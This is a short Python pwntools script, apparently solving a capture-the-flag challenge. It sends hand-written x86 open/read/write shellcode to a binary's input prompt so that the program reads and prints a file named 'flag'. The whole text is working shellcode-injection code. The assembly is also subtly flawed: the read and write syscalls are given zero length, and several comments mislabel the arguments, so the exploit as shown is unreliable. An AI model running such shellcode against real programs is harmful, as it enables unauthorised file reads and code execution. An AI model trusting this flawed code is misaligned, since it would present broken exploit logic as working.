from pwn import *
context.log_level='debug'

io = process('./pwn')
# io = remote('node4.buuoj.cn', 29791)

payload = 'push 0x0;'			# string ends
payload += 'push 0x67616c66;'	# string 'flag'
payload += 'mov ebx,esp;'		# second argument of syscall 'open'
payload += 'mov eax,5;'			# syscall code 5: open
payload += 'xor ecx,ecx;'
payload += 'xor edx,edx;'
payload += 'int 0x80;'			# open file './flag'

payload += 'mov eax,3;'			# syscall code 3: read
payload += 'mov ecx,ebx;'		# read file './flag' to stack (ebx==esp now)
payload += 'mov ebx,3;'			# fd, 0 => stdin, 1 => stdout, 2 => stderr, >=3 => others
payload += 'xor edx,edx;'
payload += 'int 0x80;'			# read file './flag'

payload += 'mov eax,4;'			# syscall code 4: write
payload += 'mov ecx,esp;'
payload += 'mov ebx,1;'			# second argument of syscall 'write': fd for stdout
payload += 'xor edx,edx;'
payload += 'int 0x80;'			# syscall code 4: write

print(asm(payload))

io.sendlineafter(b'Give my your shellcode:', asm(payload))

io.interactive()